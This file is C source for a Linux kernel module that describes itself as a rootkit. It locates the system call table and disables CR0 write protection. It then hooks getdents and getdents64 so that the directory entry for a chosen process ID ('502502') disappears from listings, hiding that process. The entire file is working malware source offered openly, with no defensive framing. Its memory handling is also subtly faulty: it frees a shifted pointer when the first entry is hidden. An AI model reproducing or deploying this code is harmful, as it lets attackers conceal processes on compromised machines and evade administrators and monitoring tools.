#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>


MODULE_LICENSE("GPL");

#define PID_TO_HIDE "502502"
#define DEBUG

struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
};

static unsigned long ** p_sys_call_table;

asmlinkage int (*original_getdents64)(const struct pt_regs * pt_regs);
asmlinkage int (*original_getdents)(const struct pt_regs * pt_regs);

#ifdef DEBUG
asmlinkage int (*test_getdents64)(const struct pt_regs * pt_regs);
#endif


/*
* Function: hooked_getdents64
* -------------------------
* This function is the hook for getdents64
* calling the original getdents64, and modify the structs if needed.
* return the length of the modified structs. just like the original getdents64 returns.
*/
asmlinkage int hooked_getdents64(const struct pt_regs * pt_regs)
{
    printk(KERN_INFO "[+] rootkit successfull hook!\n");
    int ret = original_getdents64(pt_regs);
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    // si is the second arguments on x86_64 (man syscall)
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)pt_regs->si;

    unsigned long i = 0;

    int err;
    if (ret <= 0)
    {
        printk(KERN_INFO "[-] rootkit error in original_getdents64 call\n");
        return ret;
    }
    printk(KERN_INFO "[+] rootkit original_getdents64 return value: %d\n", ret);
    
    kdirent = (void*) kvzalloc(ret, GFP_KERNEL);
    if (NULL == kdirent)
    {
        return ret;
    }

    err = copy_from_user((void*) kdirent, dirent, (unsigned long)ret);

    if (err)
    {
        printk(KERN_INFO "[-] rootkit error in copy_from_user 1\n");
        kvfree(kdirent);
        return ret;
    }
    printk(KERN_INFO "[+] rootkit success on copy_from_user 1\n");

    while (i < ret)
    {
        dir = (void *) kdirent + i;
        
        #ifdef DEBUG
        printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
        #endif

        if ((strlen((char*) dir->d_name) == strlen(PID_TO_HIDE)) && ((memcmp(PID_TO_HIDE, (char*) dir->d_name, strlen(PID_TO_HIDE))) == 0))
        {
            printk(KERN_INFO "[DEBUG] rootkit found the correct file name!\n");
            if (dir == kdirent)
            {
                ret -= dir->d_reclen;
                kdirent = (void*)dir + dir->d_reclen;
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        
        i += dir->d_reclen;
    }

    #ifdef DEBUG
    i = 0;
    printk(KERN_INFO "[DEBUG] rootkit printing the patched dirent struct\n");
    while (i < ret)
    {
        dir = (void *) kdirent + i;
        printk(KERN_INFO "[DEBUG] rootkit name: %s\n", (char*)dir->d_name);
        i += dir->d_reclen;
    }
    #endif

    err = copy_to_user(dirent, kdirent, (unsigned long) ret);
    if (err)
    {
        printk(KERN_INFO "[-] rootkit error in copy_to_user 1\n");
    }

    kvfree(kdirent);
    return ret;
}

/*
* Function: hooked_getdents
* -------------------------
* This function is the hook for getdents
* calling the original getdents, and modify the structs if needed.
* return the length of the modified structs. just like the original getdents returns.
*/
asmlinkage int hooked_getdents(const struct pt_regs * pt_regs)
{
    printk(KERN_INFO "[+] rootkit successfull hook!\n");
    int ret = original_getdents(pt_regs);
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    // si is the second arguments on x86_64 (man syscall)
    struct linux_dirent __user *dirent = (struct linux_dirent *)pt_regs->si;

    unsigned long i = 0;

    int err;
    if (ret <= 0)
    {
        printk(KERN_INFO "[-] rootkit error in original_getdents call\n");
        return ret;
    }
    printk(KERN_INFO "[+] rootkit original_getdents return value: %d\n", ret);
    
    kdirent = (void*) kvzalloc(ret, GFP_KERNEL);
    if (NULL == kdirent)
    {
        return ret;
    }

    err = copy_from_user((void*) kdirent, dirent, (unsigned long)ret);

    if (err)
    {
        printk(KERN_INFO "[-] rootkit error in copy_from_user 1\n");
        kvfree(kdirent);
        return ret;
    }
    printk(KERN_INFO "[+] rootkit success on copy_from_user 1\n");

    while (i < ret)
    {
        dir = (void *) kdirent + i;
        
        #ifdef DEBUG
        printk(KERN_INFO "[DEBUG] rootkit dir name: %s\n", (char*)dir->d_name);
        #endif

        if ((strlen((char*) dir->d_name) == strlen(PID_TO_HIDE)) && ((memcmp(PID_TO_HIDE, (char*) dir->d_name, strlen(PID_TO_HIDE))) == 0))
        {
            printk(KERN_INFO "[DEBUG] rootkit found the correct file name!\n");
            if (dir == kdirent)
            {
                ret -= dir->d_reclen;
                kdirent = (void*)dir + dir->d_reclen;
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        
        i += dir->d_reclen;
    }

    #ifdef DEBUG
    i = 0;
    printk(KERN_INFO "[DEBUG] rootkit printing the patched dirent struct\n");
    while (i < ret)
    {
        dir = (void *) kdirent + i;
        printk(KERN_INFO "[DEBUG] rootkit name: %s\n", (char*)dir->d_name);
        i += dir->d_reclen;
    }
    #endif

    err = copy_to_user(dirent, kdirent, (unsigned long) ret);
    if (err)
    {
        printk(KERN_INFO "[-] rootkit error in copy_to_user 1\n");
    }

    kvfree(kdirent);
    return ret;
}

/*
* Function: disable_wp_protection
* -------------------------------
* This function changing the 16'th bit on the cr0 register
* changing this bit enable us to write to ro pages.
*/
static void disable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if (!(value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value & ~0x00010000));
}

/*
* Function: enable_wp_protection
* ------------------------------
* This function changing the 16'th bit on the cr0 register
* changing this bit disable us to write to ro pages.
*/
static void enable_wp_protection(void)
{
    unsigned long value;
    asm volatile ("mov %%cr0, %0":"=r" (value));

    if ((value & 0x00010000))
        return;

    asm volatile ("mov %0, %%cr0"::"r" (value | 0x00010000));
}


/*
* Function: set_original_addresses
* --------------------------------
* This function setting the pointer to the original functions.
* Then, when we want we can call them to get the original values.
* Getting the information directly from the syscall table.
* return 1 - error. 0 - success.
*/
static int set_original_addresses(void)
{
    // Try to find the original getdents64 pointer.
    original_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
    if (0 == original_getdents64)
    {
        printk(KERN_INFO "[-] rootkit Error finding the original_getdents64\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit original_getdents64 = %p\n", original_getdents64);

    // Try to find the original getdents pointer.
    original_getdents = (void *)p_sys_call_table[__NR_getdents];
    if (0 == original_getdents)
    {
        printk(KERN_INFO "[-] rootkit Error finding the original_getdents\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit original_getdents = %p\n", original_getdents);

    return 0;

}

/*
* Function: register_hooks
* ------------------------
* This function registering our hooks by changing the syscall table to our hooked functions.
*/
static void register_hooks(void){
    printk(KERN_INFO "[+] rootkit setting the getdents64 and getdents pointers to out pointers. out ptr 64:%p 32:%p\n", hooked_getdents64, hooked_getdents);
    disable_wp_protection();
    p_sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    p_sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    enable_wp_protection();
}


/*
* Function: unregister_hooks
* --------------------------
* This function unregistering our hooks by changing the syscall table to the original pointers.
*/
static void unregister_hooks(void){
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
    disable_wp_protection();
    p_sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    enable_wp_protection();
}

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");
    int err;
    //Find the sys_call_table pointer in the kernel, you can check in /proc/kallsyms if its the same pointer.
    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
    if (0 == p_sys_call_table)
    {
        printk(KERN_INFO "[!] rootkit Error Finding sys_call_table\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit p_sys_call_table = %p\n", p_sys_call_table);

    err = set_original_addresses();
    if(err){
        printk(KERN_INFO "[-] rootkit there was an error finding original function pointers. not setting hooks.\n");        
        return 1;
    }

    register_hooks();

    #ifdef DEBUG
    test_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
    if (0 == test_getdents64)
    {
        printk(KERN_INFO "[DEBUG] rootkit Error finding the test_getdents64\n");
        return 1;
    }
    printk(KERN_INFO "[DEBUG] rootkit test_getdents64 = %p\n", test_getdents64);
    #endif

    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");    
    unregister_hooks();
    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);